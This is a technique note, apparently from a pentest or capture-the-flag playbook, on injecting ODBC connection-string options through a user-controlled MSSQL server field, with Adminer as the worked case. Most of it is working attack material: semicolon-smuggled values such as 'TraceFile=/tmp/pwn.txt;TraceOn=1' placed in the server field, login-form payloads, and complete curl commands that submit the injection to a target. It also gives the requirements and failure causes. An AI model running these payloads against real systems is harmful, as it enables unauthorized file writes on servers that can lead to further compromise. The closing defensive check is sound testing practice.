# MSSQL ODBC TraceFile DSN Injection

## Context

Use this pattern only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

This applies when a user-controlled MSSQL server or host field is concatenated into a SQL Server PDO or ODBC connection string.

## Payload Shape

Write an ODBC trace file to a chosen path:

```text
127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

Set a marker that should appear in the trace:

```text
username=marker
password=x
```

For the Adminer login form, the relevant fields are:

```text
auth[driver]=mssql
auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
auth[username]=marker
auth[password]=x
auth[db]=
```

## Requirements

- The MSSQL connection path uses `pdo_sqlsrv` or another vulnerable ODBC/DSN parser path.
- Microsoft ODBC Driver is installed.
- The application concatenates the server field into DSN syntax.
- Semicolons are not rejected before driver construction.
- The chosen trace path is writable by the PHP/ODBC process.
- The trace contains a controlled field such as username.

## Why It Worked

The application intends to pass a host:

```text
127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

The driver receives connection-string syntax:

```text
sqlsrv:Server=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1
```

ODBC interprets:

```text
Server=127.0.0.1
TraceFile=/tmp/pwn.txt
TraceOn=1
```

The trace is written before successful authentication is required.

## Why It Fails

- The app rejects `;` in the server field.
- The app parses host and port strictly.
- The target uses the non-PDO `sqlsrv_connect()` branch instead of the vulnerable PDO DSN path.
- `pdo_sqlsrv` or Microsoft ODBC Driver is missing.
- ODBC tracing is disabled or the options are ignored.
- The destination path is not writable.
- The request does not preserve application session state across a login redirect.
- The challenge requires exact file content, but the trace contains additional metadata.

## Minimal Test

For Adminer-style login flows, initialize a session first:

```bash
curl -s \
  -c /tmp/adminer-cookies.txt \
  -b /tmp/adminer-cookies.txt \
  https://target.example/adminer.php \
  >/tmp/adminer-login.html
```

Then submit:

```bash
curl -i -L \
  -c /tmp/adminer-cookies.txt \
  -b /tmp/adminer-cookies.txt \
  https://target.example/adminer.php \
  -d 'auth[driver]=mssql' \
  --data-urlencode 'auth[server]=127.0.0.1;TraceFile=/tmp/pwn.txt;TraceOn=1' \
  --data-urlencode 'auth[username]=marker' \
  --data-urlencode 'auth[password]=x' \
  --data-urlencode 'auth[db]='
```

Useful signal:

```text
SQLSTATE[HYT00]: [Microsoft][ODBC Driver 18 for SQL Server]Login timeout expired
```

That error confirms the request reached the Microsoft ODBC driver. It does not by itself prove file write; pair it with local file evidence, gate behavior, or server logs.

## Follow-Up

For defensive testing, assert that the application rejects the semicolon-delimited server value before invoking the driver.

Do not store live flags, cookies, private target URLs, or real secrets in reusable payload files.
